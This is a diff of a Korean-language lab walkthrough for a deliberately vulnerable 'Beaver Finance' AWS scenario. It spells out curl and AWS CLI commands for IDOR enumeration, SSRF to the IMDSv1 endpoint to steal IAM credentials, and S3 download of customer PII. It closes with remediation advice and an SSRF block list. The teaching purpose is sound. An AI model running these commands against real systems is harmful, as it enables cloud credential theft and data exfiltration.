@@ -2,208 +2,187 @@
 
 ## Step 1: 정찰
 
-게이트웨이 URL을 획득하고 API 포탈에 접속합니다.
-
-### 방법 1: 웹 브라우저 사용
-
-1. 게이트웨이 URL을 웹 브라우저에서 오픈
-2. Beaver Finance - Customer Portal 확인:
-   - 서비스명: "Beaver Finance - Customer Portal"
-   - API 버전: v5.0 production
-   - 상태: healthy
-3. Document Lookup 섹션 확인
-
-### 방법 2: CLI 사용
+웹 애플리케이션에 접속하고 기능을 파악합니다.
 
 ```bash
 cd terraform
 terraform output scenario_entrypoint_url
 ```
 
-URL 획득 후:
+URL을 브라우저에서 열어 **Beaver Finance - Customer Portal**을 확인합니다.
 
-```bash
-GW=http://<gateway-ip>
-curl -s $GW/api/v5/status
-```
+![Beaver Finance 초기 화면](./assets/image/legacy-bridge-initial-screen.png)
+
+주요 관찰 사항:
+- 서비스명: "Beaver Finance - Customer Portal"
+- 버전: v5.0 production
+- **Document Lookup** 섹션에 문서 번호 입력 필드와 선택적 Source URL 필드가 존재
+- Source URL 필드는 SSRF 벡터 가능성을 시사
 
 ---
 
 ## Step 2: 정상 기능 테스트
 
-### 방법 1: 웹 브라우저 사용
+유효한 문서 번호로 조회 기능이 정상 작동하는지 확인합니다.
 
-1. Document Lookup 섹션에서 Document number 칸 확인
-2. Document number에 1을 입력
-3. "Look up" 버튼 클릭
-4. 응답 확인:
-   - customer_name: Aaron Whitfield
-   - application_id: APP-2024-000142
-   - file_name: statement_2024_07.pdf
-   - internal_source: http://internal-source-ip/api/v1/legacy/media-info?...
-   - metadata: 고객 정보 포함
+> **참고:** 문서 ID 1~12가 사전에 등록되어 있습니다. 해당 범위 내 숫자를 입력하면 고객 데이터가 반환됩니다.
+
+### 방법 1: 웹 브라우저 사용
+1. Document number 필드에 `1` 입력
+2. Source URL은 비워두기
+3. **Look up** 버튼 클릭
+4. 응답에 고객 데이터가 포함되는지 확인:
+   - customer_name, application_id, file_name
+   - 백엔드 URL이 노출되는 `internal_source` 필드
 
 ### 방법 2: CLI 사용
-
 ```bash
 GW=http://<gateway-ip>
 curl -s "$GW/api/v5/legacy/media-info?file_id=1"
-curl -s "$GW/api/v5/legacy/media-info?file_id=2"
 ```
 
-API가 정상 작동함을 확인합니다.
+문서 조회가 정상적으로 작동합니다.
 
 ---
 
-## Step 3: 취약점 발견 - IDOR
+## Step 3: 취약점 발견 — IDOR
+
+문서 번호를 순차적으로 변경하여 IDOR 취약점을 확인합니다.
 
 ### 방법 1: 웹 브라우저 사용
+1. Document number 필드에 1부터 12까지 순서대로 입력
+2. 각각 **Look up** 클릭
+3. 인증 없이 모든 고객 데이터에 접근 가능한지 확인
 
-1. Document Lookup 섹션에서
-2. Document number 칸에 1부터 12까지 순서대로 입력해보기
-3. 각각 "Look up" 버튼 클릭
-4. 권한 확인 없이 모든 고객의 데이터 접근 가능 확인:
-   - Document number 1: Aaron Whitfield
-   - Document number 2: 다른 고객
-   - Document number 3: 또 다른 고객
-   - ...
-   - Document number 12: 또 다른 고객
-5. 각 응답에서 `internal_source` 필드 확인:
-   ```
-   http://internal-source-ip/api/v1/legacy/media-info?source=...
-   ```
+![IDOR 열거](./assets/image/legacy-bridge-idor-enumeration.png)
 
-![IDOR Enumeration](./assets/images/legacy-bridge-idor-enumeration.png)
+응답에서 내부 호스트명이 포함된 백엔드 오류가 노출됩니다:
+
+```
+{"backend_response": "{'detail': 'HTTPConnectionPool(host='internal-media-cdn.legacy', port=80): Max retries exceeded..."}
+```
 
 ### 방법 2: CLI 사용
-
 ```bash
 GW=http://<gateway-ip>
-for i in {1..12}; do curl -s "$GW/api/v5/legacy/media-info?file_id=$i"; done
+for i in {1..12}; do
+  curl -s "$GW/api/v5/legacy/media-info?file_id=$i"
+done
 ```
 
-**IDOR 취약점 확인:** Document number (file_id)만 변경하면 권한 없이 모든 고객 데이터에 접근 가능합니다.
+**IDOR 취약점 확인.** `file_id`만 바꾸면 인증 없이 임의의 고객 데이터에 접근할 수 있습니다. `internal_source` 필드에서 내부 백엔드 호스트명 `internal-media-cdn.legacy`도 노출됩니다.
 
 ---
 
-## Step 4: 취약점 발견 - SSRF
+## Step 4: 취약점 발견 — SSRF
+
+선택적 Source URL 필드가 백엔드로 그대로 전달되는지 확인합니다.
 
 ### 방법 1: 웹 브라우저 사용
-
-1. Document number 칸에 1 입력
-2. Source URL (optional) 칸에 `http://example.com` 입력
-3. "Look up" 버튼 클릭
-4. 응답 확인:
-   ```
-   backend_response: example.com의 콘텐츠 또는 오류 메시지
-   backend_status: 200 또는 502
-   ```
-5. source 파라미터가 internal source IP로 전달되고 있음 확인
+1. Document number 필드에 `1` 입력
+2. Source URL 필드에 `http://example.com` 입력
+3. **Look up** 클릭
+4. 응답에 `example.com`에서 가져온 내용이 포함되는지 확인
 
 ### 방법 2: CLI 사용
-
 ```bash
 GW=http://<gateway-ip>
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://example.com"
 ```
 
-**SSRF 취약점 확인:** source 파라미터가 백엔드 서버로 전달되어 임의의 URL 접근 가능합니다.
+**SSRF 취약점 확인.** `source` 파라미터가 백엔드 서버로 전달되어 공격자가 지정한 임의의 URL에 요청이 가능합니다.
 
 ---
 
-## Step 5: SSRF로 IAM 역할 이름 탈취
+## Step 5: SSRF → IMDSv1로 IAM 역할 이름 추출
+
+SSRF를 이용해 EC2 인스턴스 메타데이터 서비스(IMDS)에 접근하고 IAM 역할 이름을 열거합니다.
 
 ### 방법 1: 웹 브라우저 사용
-
-1. Document number 칸에 1 입력
-2. Source URL 칸에 IMDSv1 메타데이터 경로 입력:
-   ```
+1. Document number 필드에 `1` 입력
+2. Source URL 필드에 아래 경로 입력:
+```
    http://169.254.169.254/latest/meta-data/iam/security-credentials/
-   ```
-3. "Look up" 버튼 클릭
+```
+3. **Look up** 클릭
 4. 응답의 `backend_response` 필드에서 역할 이름 추출:
-   ```
-   legacy-bridge-Shadow-API-Role-xxx
-   ```
-5. 역할 이름을 메모합니다
-
-![IMDS Role Extraction](./assets/images/legacy-bridge-imds-role-extraction.png)
+```
+   legacy-bridge-Shadow-API-Role-<suffix>
+```
 
 ### 방법 2: CLI 사용
-
 ```bash
 GW=http://<gateway-ip>
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
 ```
 
-응답에서 `legacy-bridge-Shadow-API-Role-xxx` 형식의 역할 이름을 추출합니다.
+다음 단계를 위해 역할 이름을 저장합니다.
 
 ---
 
 ## Step 6: IMDSv1에서 임시 자격증명 탈취
 
+Step 5에서 확인한 역할로 IMDS 엔드포인트를 직접 조회해 임시 자격증명을 획득합니다.
+
 ### 방법 1: 웹 브라우저 사용
+1. Document number 필드에 `1` 입력
+2. Source URL 필드에 Step 5의 역할 이름을 사용해 URL 구성:
+```
+   http://169.254.169.254/latest/meta-data/iam/security-credentials/legacy-bridge-Shadow-API-Role-<suffix>
+```
+3. **Look up** 클릭
 
-1. Document number 칸에 1 입력
-2. Source URL 칸에 Step 5의 역할 이름으로 구성:
-   ```
-   http://169.254.169.254/latest/meta-data/iam/security-credentials/legacy-bridge-Shadow-API-Role-xxx
-   ```
-3. "Look up" 버튼 클릭
-4. 응답의 `backend_response` 필드에 JSON 자격증명:
-   ```json
-   {
-     "Code": "Success",
-     "LastUpdated": "2026-05-01T00:12:34Z",
-     "Type": "AWS-HMAC",
-     "AccessKeyId": "",
-     "SecretAccessKey": "",
-     "Token": "",
-     "Expiration": "2026-05-01T06:27:25Z"
-   }
-   ```
-5. 모든 자격증명 정보 메모
+![IMDS 역할 자격증명 추출](./assets/image/legacy-bridge-imds-role-extraction.png)
 
-![IMDS Credentials Extraction](./assets/images/legacy-bridge-imds-credentials-extraction.png)
+응답의 `backend_response` 필드에서 자격증명을 확인합니다:
+
+```json
+{
+  "Code": "Success",
+  "LastUpdated": "2026-04-30T22:47:00Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "2026-05-01T06:27:25Z"
+}
+```
 
 ### 방법 2: CLI 사용
-
 ```bash
 GW=http://<gateway-ip>
-ROLE="legacy-bridge-Shadow-API-Role-xxx"
+ROLE="legacy-bridge-Shadow-API-Role-<suffix>"
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
 ```
 
-응답에서 다음 자격증명을 추출합니다:
-```
-AccessKeyId
-SecretAccessKey
-Token
-Expiration
-```
+**SSRF → IMDSv1 자격증명 탈취 확인.**  
+Shadow API EC2는 `http_tokens = "optional"` (IMDSv1 활성화) 상태이므로 토큰 사전 요청 없이 바로 접근 가능합니다.
 
 ---
 
 ## Step 7: AWS CLI 환경 설정
 
-### CLI 사용
-
-Step 6에서 탈취한 임시 자격증명을 환경변수로 설정합니다:
+Step 6에서 탈취한 임시 자격증명을 환경변수로 설정합니다.
 
 ```bash
-export AWS_ACCESS_KEY_ID=""
-export AWS_SECRET_ACCESS_KEY=""
-export AWS_SESSION_TOKEN=""
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
 export AWS_DEFAULT_REGION="us-east-1"
+```
+
+프로파일로 설정하는 경우:
+
+```bash
+aws configure --profile victim
+aws configure set aws_session_token "..." --profile victim
 ```
 
 ---
 
 ## Step 8: 자격증명 유효성 확인
 
-### CLI 사용
-
-탈취한 자격증명이 실제로 작동하는지 확인합니다:
+탈취한 자격증명이 실제로 작동하는지 확인합니다.
 
 ```bash
 aws sts get-caller-identity
@@ -214,93 +193,117 @@ aws sts get-caller-identity
 {
     "UserId": "AROAY5XXXXXXXXXXX:i-0xxxxxxxxxxxxxxx",
     "Account": "123456789012",
-    "Arn": "arn:aws:iam::123456789012:assumed-role/legacy-bridge-Shadow-API-Role-xxx/i-0xxxxxxxxxxxxxxx"
+    "Arn": "arn:aws:sts::123456789012:assumed-role/legacy-bridge-Shadow-API-Role-<suffix>/i-0xxxxxxxxxxxxxxx"
 }
 ```
 
-`legacy-bridge-Shadow-API-Role-xxx` 역할로 인증됨을 확인합니다.
+**Shadow API Role** (`legacy-bridge-Shadow-API-Role-<suffix>`)으로 인증되었습니다.
 
 ---
 
-## Step 9: IAM 정책 분석
+## Step 9: IAM 권한 열거
 
-### CLI 사용
-
-할당된 정책의 상세 내용을 확인합니다:
+Shadow API Role에 부여된 권한을 확인합니다.
 
 ```bash
-ROLE_NAME="legacy-bridge-Shadow-API-Role-xxx"
-aws iam get-role-policy --role-name $ROLE_NAME --policy-name shadow-api-policy
+ROLE_NAME="legacy-bridge-Shadow-API-Role-<suffix>"
+
+# 인라인 정책 목록 조회
+aws iam list-role-policies --role-name $ROLE_NAME
 ```
 
 출력:
 ```json
 {
-    "RoleName": "legacy-bridge-Shadow-API-Role-xxx",
-    "PolicyName": "shadow-api-policy",
-    "PolicyDocument": {
-        "Version": "2012-10-17",
-        "Statement": [
-            {
-                "Sid": "S3ReadAccess",
-                "Effect": "Allow",
-                "Action": [
-                    "s3:GetObject",
-                    "s3:ListBucket"
-                ],
-                "Resource": [
-                    "arn:aws:s3:::prime-pii-vault-*",
-                    "arn:aws:s3:::prime-pii-vault-*/*"
-                ]
-            }
-        ]
-    }
+    "PolicyNames": [
+        "legacy-bridge-shadow-api-s3-<suffix>"
+    ]
 }
 ```
 
-이 역할은 `prime-pii-vault-*` 버킷에 대해 `GetObject`와 `ListBucket` 권한을 가집니다.
+인라인 정책이 존재합니다. 상세 내용을 확인합니다.
+
+```bash
+aws iam get-role-policy \
+  --role-name $ROLE_NAME \
+  --policy-name legacy-bridge-shadow-api-s3-<suffix>
+```
+
+출력:
+```json
+{
+    "Statement": [
+        {
+            "Sid": "AllowDiscoverBuckets",
+            "Effect": "Allow",
+            "Action": ["s3:ListAllMyBuckets", "s3:GetBucketLocation"],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowCheckOwnRolePermissions",
+            "Effect": "Allow",
+            "Action": ["iam:ListRolePolicies", "iam:GetRolePolicy"],
+            "Resource": "arn:aws:iam::123456789012:role/legacy-bridge-Shadow-API-Role-<suffix>"
+        },
+        {
+            "Sid": "AllowListPiiVault",
+            "Effect": "Allow",
+            "Action": ["s3:ListBucket"],
+            "Resource": "arn:aws:s3:::legacy-bridge-pii-vault-<suffix>"
+        },
+        {
+            "Sid": "AllowReadPiiVaultObjects",
+            "Effect": "Allow",
+            "Action": ["s3:GetObject"],
+            "Resource": "arn:aws:s3:::legacy-bridge-pii-vault-<suffix>/*"
+        }
+    ]
+}
+```
+
+**PII Vault S3 버킷에 대한 읽기 권한 확인.**
+
+```bash
+# 관리형 정책 확인
+aws iam list-attached-role-policies --role-name $ROLE_NAME
+```
+
+출력:
+```json
+{ "AttachedPolicies": [] }
+```
+
+관리형 정책은 없으며 인라인 정책만 사용 중입니다.
 
 ---
 
-## Step 10: S3 버킷 목록 조회
+## Step 10: S3 PII Vault 열거
 
-### CLI 사용
-
-접근 가능한 S3 버킷을 확인합니다:
+접근 가능한 S3 버킷을 확인하고 내용을 열거합니다.
 
 ```bash
 aws s3 ls
+# → legacy-bridge-pii-vault-<suffix>
+
+aws s3 ls s3://legacy-bridge-pii-vault-<suffix>/ --recursive
 ```
 
 출력:
 ```
-2026-05-01 00:00:00 prime-pii-vault-xxx
-```
-
-버킷 내용을 확인합니다:
-
-```bash
-aws s3 ls s3://prime-pii-vault-xxx/ --recursive
-```
-
-출력:
-```
-2026-05-01 00:00:00          1024 applications/customer_credit_applications.csv
-2026-05-01 00:00:00           512 applications/migration_log.txt
-2026-05-01 00:00:00           256 applications/q1_2024_summary.txt
-2026-05-01 00:00:00          2048 confidential/breach_notice.txt
+2026-05-01 00:00:00   applications/customer_credit_applications.csv
+2026-05-01 00:00:00   applications/migration_log.txt
+2026-05-01 00:00:00   applications/q1_2024_summary.txt
+2026-05-01 00:00:00   confidential/breach_notice.txt
 ```
 
 ---
 
 ## Step 11: 민감한 데이터 탈취
 
-### CLI 사용
-
-고객 신용 신청서를 다운로드합니다:
+고객 신용 신청서를 다운로드합니다.
 
 ```bash
-aws s3 cp s3://prime-pii-vault-xxx/applications/customer_credit_applications.csv .
+aws s3 cp s3://legacy-bridge-pii-vault-<suffix>/applications/customer_credit_applications.csv .
 cat customer_credit_applications.csv
 ```
 
@@ -309,54 +312,49 @@ cat customer_credit_applications.csv
 customer_id,name,ssn,email,phone,credit_score
 001,John Doe,123-45-6789,john@example.com,555-1234,750
 002,Jane Smith,987-65-4321,jane@example.com,555-5678,720
+...
 ```
 
-수천 개의 고객 신용 신청서가 노출됩니다. 각각에는 이름, 주민등록번호, 이메일, 전화번호, 신용점수 등 민감한 정보가 포함되어 있습니다.
+수천 건의 고객 신용 신청서가 노출됩니다. 각 레코드에는 이름, 주민등록번호, 이메일, 전화번호, 신용점수 등 민감한 정보가 포함되어 있습니다.
 
 ---
 
 ## Step 12: 플래그 획득
 
-### CLI 사용
-
-침해 통지 파일을 다운로드합니다:
+침해 통지 파일을 다운로드합니다.
 
 ```bash
-aws s3 cp s3://prime-pii-vault-xxx/confidential/breach_notice.txt .
-cat breach_notice.txt
+aws s3 cp s3://legacy-bridge-pii-vault-<suffix>/confidential/breach_notice.txt -
 ```
 
 출력 결과에 플래그가 포함됩니다.
 
 ---
 
-## 공격 체인
+## 공격 체인 요약
 
 ```
-1. Beaver Finance API Portal (v5)
-   ↓ IDOR via file_id parameter (sequential enumeration)
-2. Customer Data Leak
-   ↓ internal_source field exposing backend URL
-3. SSRF via source parameter
-   ↓ source parameter forwarded to backend
-4. IMDSv1 Access (169.254.169.254)
-   ↓ Query /latest/meta-data/iam/security-credentials/
-5. Extract IAM Role Name
-   ↓ legacy-bridge-Shadow-API-Role-xxx
-6. IMDSv1 Credential Extraction
+1. Beaver Finance Customer Portal (v5.0)
+   ↓ file_id 파라미터 IDOR — 순차 열거
+2. 고객 데이터 노출
+   ↓ internal_source 필드에서 백엔드 호스트명 노출 (internal-media-cdn.legacy)
+3. source 파라미터를 통한 SSRF
+   ↓ 임의 URL이 백엔드로 전달됨
+4. IMDSv1 (169.254.169.254) — 토큰 불필요
+   ↓ IAM 역할 열거: legacy-bridge-Shadow-API-Role-<suffix>
+5. IMDSv1 자격증명 탈취
    ↓ AccessKeyId, SecretAccessKey, Token
-7. AWS CLI Configuration
-   ↓ Export credentials as environment variables
-8. sts:GetCallerIdentity
-   ↓ Verify assumed role identity
+6. AWS CLI 환경 설정
+   ↓ 환경변수로 자격증명 설정
+7. sts:GetCallerIdentity
+   ↓ Assumed Role 신원 확인
+8. iam:ListRolePolicies
+   ↓ 인라인 정책 이름 확인
 9. iam:GetRolePolicy
-   ↓ Analyze policy - find S3 read access
-10. s3:ListBucket
-    ↓ Enumerate bucket contents (prime-pii-vault-xxx)
-11. s3:GetObject
-    ↓ Download PII data (customer_credit_applications.csv, breach_notice.txt)
-12. Flag extraction from breach_notice.txt
-    ↓ 출력 결과에 플래그가 포함됩니다
+   ↓ legacy-bridge-pii-vault-<suffix>에 대한 S3 읽기 권한 확인
+10. s3:ListBucket + s3:GetObject
+    ↓ PII Vault 내용 열거 및 다운로드
+11. confidential/breach_notice.txt에서 플래그 추출
 ```
 
 ---
@@ -364,50 +362,98 @@ cat breach_notice.txt
 ## 핵심 기법
 
 ### IDOR 파라미터 조작
-순차적인 ID를 사용하여 권한 없이 다른 사용자의 데이터에 접근합니다:
 ```bash
-curl -s "$GW/api/v5/legacy/media-info?file_id=1"
-curl -s "$GW/api/v5/legacy/media-info?file_id=2"
-curl -s "$GW/api/v5/legacy/media-info?file_id=12"
+for i in {1..12}; do
+  curl -s "$GW/api/v5/legacy/media-info?file_id=$i"
+done
 ```
 
-### SSRF를 통한 메타데이터 접근
-source 파라미터를 이용해 공격자가 지정한 URL로 요청을 강제합니다:
+### SSRF를 통한 IMDSv1 접근
 ```bash
+# IAM 역할 열거
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+# 자격증명 추출
 curl -s "$GW/api/v5/legacy/media-info?file_id=1&source=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
 ```
 
 ### IMDSv1 vs IMDSv2 비교
 
-| 특성 | IMDSv1 | IMDSv2 |
-|------|--------|--------|
-| 토큰 필요 여부 | 불필요 | **필수** |
-| SSRF 공격에 취약 | **예** | **아니오** |
-| 접근 방식 | URL 직접 접근 | PUT 요청 + 토큰 |
-| 보안 수준 | 낮음 | 높음 |
+| | IMDSv1 | IMDSv2 |
+|---|---|---|
+| 토큰 필요 여부 | **불필요** | 필요 (PUT 요청) |
+| SSRF 취약 여부 | **취약** | 취약하지 않음 |
+| 설정 | `http_tokens = "optional"` | `http_tokens = "required"` |
+
+Shadow API EC2는 `http_tokens = "optional"` 설정으로 SSRF를 통한 직접 접근이 가능합니다.
 
 ---
 
 ## 보안 교훈
 
 ### 1. 입력값 검증
-- 파라미터 값을 화이트리스트 기반으로 검증해야 합니다
-- 사용자 입력을 절대 신뢰하면 안 됩니다
-- file_id는 숫자만, source는 특정 도메인만 허용
+- `file_id`는 양의 정수만 허용하도록 검증
+- `source` 파라미터에서 RFC-1918 및 링크-로컬 대역으로의 요청 차단
+- 서버 사이드 요청에 사용자 입력 URL을 그대로 신뢰하지 않기
 
 ### 2. 메타데이터 서비스 보안
-- 모든 EC2 인스턴스에서 IMDSv2를 강제해야 합니다
-- IMDSv1은 반드시 비활성화해야 합니다
-- 보안 그룹으로 메타데이터 접근을 제한합니다
+- 모든 EC2 인스턴스에 IMDSv2 강제 적용 (`http_tokens = "required"`)
+- IMDSv1을 완전히 비활성화 — 신규 배포에서 사용할 이유가 없음
 
-### 3. 최소 권한 원칙 (Least Privilege)
-- IAM 역할에는 필요한 최소 권한만 부여합니다
-- Resource에 와일드카드("*") 사용을 피합니다
-- 특정 S3 버킷과 객체만 명시적으로 허용합니다
+### 3. 최소 권한 원칙
+- 명시적으로 필요하지 않은 경우 `Resource: "*"`에 `s3:ListAllMyBuckets` 부여 금지
+- IAM 권한은 와일드카드 패턴이 아닌 구체적인 리소스 ARN으로 제한
 
-### 4. 심층 방어 전략
-- WAF(Web Application Firewall)로 IDOR/SSRF 패턴 탐지
-- CloudTrail로 모든 S3 접근 기록
-- GuardDuty로 비정상 API 호출 탐지
-- 민감한 데이터에 대한 접근 제어와 감시
+### 4. 심층 방어
+- AWS WAF로 IDOR 및 SSRF 패턴 탐지
+- CloudTrail로 모든 S3 및 IAM API 호출 로깅
+- GuardDuty로 자격증명 오남용 및 비정상 API 활동 탐지
+
+---
+
+## 조치 방법
+
+### IMDSv2 강제 적용
+```hcl
+metadata_options {
+  http_tokens                 = "required"   # "optional"에서 변경
+  http_endpoint               = "enabled"
+  http_put_response_hop_limit = 1
+}
+```
+
+### SSRF 입력값 검증
+```python
+from urllib.parse import urlparse
+import ipaddress
+
+BLOCKED_RANGES = [
+    ipaddress.ip_network("169.254.0.0/16"),  # 링크-로컬 / IMDS
+    ipaddress.ip_network("10.0.0.0/8"),
+    ipaddress.ip_network("172.16.0.0/12"),
+    ipaddress.ip_network("192.168.0.0/16"),
+]
+
+def is_safe_url(url: str) -> bool:
+    host = urlparse(url).hostname
+    try:
+        addr = ipaddress.ip_address(host)
+        return not any(addr in net for net in BLOCKED_RANGES)
+    except ValueError:
+        return False  # 호스트명인 경우 — 재확인 필요
+```
+
+### 문서 접근 권한 검증
+```python
+def get_document(file_id: int, current_user_id: int):
+    doc = db.query(Document).filter_by(id=file_id).first()
+    if doc.owner_id != current_user_id:
+        raise PermissionError("접근 권한이 없습니다")
+    return doc
+```
+
+### 추가 보안 조치
+1. **AWS WAF 규칙**: `source` 파라미터의 사설 IP 대역 및 링크-로컬 주소를 포함한 SSRF 패턴 차단
+2. **CloudTrail 모니터링**: PII Vault 버킷의 모든 S3 GetObject/ListBucket 호출 로깅
+3. **GuardDuty**: IMDSv1 자격증명 탈취 및 비정상 S3 데이터 접근 패턴 탐지
+4. **VPC 엔드포인트 정책**: S3 접근을 애플리케이션 전용 버킷으로만 제한, VPC 외부 접근 차단
